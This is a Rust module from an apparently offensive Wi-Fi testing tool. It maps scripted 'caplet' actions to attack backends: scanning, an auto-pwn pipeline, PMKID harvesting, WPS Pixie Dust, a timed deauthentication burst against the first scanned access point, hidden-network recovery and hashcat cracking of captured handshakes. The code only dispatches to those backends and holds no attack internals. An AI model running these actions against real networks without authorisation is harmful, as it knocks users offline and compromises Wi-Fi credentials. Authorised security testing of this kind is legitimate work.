//! Caplet execution on the agent — the `run <action>` bridge.
//!
//! The engine (`common::caplet::execute_caplet`) parses and sequences; this
//! module is the `run_action` closure that turns each `run <name>` into a
//! real privileged operation against the agent's backends. Every action
//! reuses the exact same code paths the CLI/GUI menus drive, so a caplet is
//! just a scripted tour of the same attack suite — no parallel behavior to
//! drift out of sync.

use netspecter_common::caplet::{self, CapletReport, KnownAction};

/// Execute a caplet file. Reading + parsing happen first (a bad file fails
/// fast with a message, no actions run), then each `run` line dispatches to
/// the matching backend.
pub fn run_caplet_file(path: &str) -> Result<CapletReport, String> {
    let lines = caplet::load_caplet(std::path::Path::new(path))?;
    let report = caplet::execute_caplet(&lines, run_action, std::thread::sleep);
    Ok(report)
}

/// The first AP in the current snapshot, if any.
fn first_target() -> Result<netspecter_common::types::AP, String> {
    crate::backend::scan::get_aps()
        .iter()
        .next()
        .map(|(_, ap)| ap.clone())
        .ok_or_else(|| "no targets in the scan snapshot — run scan first".to_string())
}

/// Dispatch one `run <action> [args…]` to the real backend.
fn run_action(name: &str, _args: &[String]) -> Result<String, String> {
    let _ = _args;
    let action = KnownAction::from_name(name)
        .ok_or_else(|| format!("unknown action '{name}'"))?;

    match action {
        KnownAction::Scan => {
            let iface = crate::backend::interface::get_iface()
                .ok_or_else(|| "no interface selected — pick one in the CLI/GUI first".to_string())?;
            crate::backend::scan::set_scan_process(&iface, true, true, None)
                .map_err(|e| e.to_string())?;
            Ok("scan started (2.4 + 5 GHz, all channels)".into())
        }
        KnownAction::AttackAll => {
            // The ranked auto-pwn pipeline. It streams events to its channel;
            // a caplet kicks it off and reports the queue was accepted.
            let cfg = netspecter_common::autopwn::AutoPwnConfig::default();
            let _events = super::autopwn_runner::run_auto_pwn(cfg);
            Ok("auto-pwn pipeline started (watch the GUI/CLI stream for results)".into())
        }
        KnownAction::Pmkid => {
            let target = first_target()?;
            match crate::backend::pmkid::harvest_pmkid(&target.bssid, &target.essid, 60) {
                Some(c) => Ok(format!("PMKID captured for {}", c.bssid)),
                None => Err("PMKID harvest timed out (no M1 in window)".into()),
            }
        }
        KnownAction::WpsPixie => {
            let target = first_target()?;
            let out = crate::backend::wps::try_pixie_dust(&target.bssid, &[], &[]);
            match out.pin {
                Some(pin) => Ok(format!("WPS PIN {pin}")),
                None => Err(out.status),
            }
        }
        KnownAction::Deauth => {
            let iface = crate::backend::interface::get_iface()
                .ok_or_else(|| "no interface selected".to_string())?;
            let target = first_target()?;
            crate::backend::deauth::launch_deauth_attack(&iface, target.clone(), None, 128, false)
                .map_err(|e| e.to_string())?;
            std::thread::sleep(std::time::Duration::from_secs(10));
            crate::backend::deauth::stop_deauth_attack(&target.bssid);
            Ok(format!("10s deauth burst against {}", target.bssid))
        }
        KnownAction::HiddenRecovery => {
            let hidden = crate::backend::scan::get_aps()
                .iter()
                .filter(|(_, ap)| ap.hidden || ap.essid.is_empty())
                .map(|(_, ap)| ap.clone())
                .collect::<Vec<_>>();
            if hidden.is_empty() {
                return Ok("no hidden networks in the snapshot".into());
            }
            let mut found = 0usize;
            for ap in &hidden {
                if !crate::backend::hidden::discover_hidden_essid(&ap.bssid, &ap.channel).is_empty() {
                    found += 1;
                }
            }
            Ok(format!("hidden recovery: {found} name(s) found"))
        }
        KnownAction::Karma => Err(
            "karma holds the radio for its whole duration — start it from the CLI/GUI, not a caplet".into(),
        ),
        KnownAction::CrackQueue => {
            // Run the hashcat chain over every persisted .hc22000 capture.
            let wordlists = netspecter_common::wordlists::default_chain();
            if wordlists.is_empty() {
                return Err("no wordlists available — download one via the wordlist manager".into());
            }
            let mut recovered = 0usize;
            for hashfile in super::autopwn_runner::collected_hashfiles() {
                if super::autopwn_runner::try_crack_hashfile(&hashfile, &wordlists).is_some() {
                    recovered += 1;
                }
            }
            Ok(format!("crack queue: {recovered} capture(s) cracked"))
        }
        KnownAction::Report => {
            // A snapshot-style report: current APs + unlinked clients as the
            // target record. The full engagement report stays a GUI/wizard
            // deliverable — a caplet gets the JSON snapshot.
            let aps = crate::backend::scan::get_aps();
            let clients = crate::backend::scan::get_unlinked_clients();
            let targets: Vec<_> = aps
                .iter()
                .map(|(_, ap)| netspecter_common::backend_types::TargetReport {
                    bssid: ap.bssid.clone(),
                    essid: ap.essid.clone(),
                    encryption: ap.encryption.clone(),
                    channel: ap.channel.clone(),
                    clients_observed: ap.clients.len() as u32,
                    handshake_captured: ap.handshake,
                    pmkid_captured: ap.saved_handshake.is_some(),
                    wps_recovered: false,
                    hidden_recovery: None,
                })
                .collect();
            let report = crate::backend::report::build_report(
                "caplet",
                "agent",
                "",
                targets,
                Vec::new(),
            );
            let path = std::path::PathBuf::from(format!(
                "/var/lib/netspecter/caplet-report-{}.json",
                chrono::Utc::now().format("%Y%m%d-%H%M%S")
            ));
            crate::backend::report::render_json(&report, &path)
                .map_err(|e| e.to_string())?;
            Ok(format!("report written to {}", path.display()))
        }
    }
}
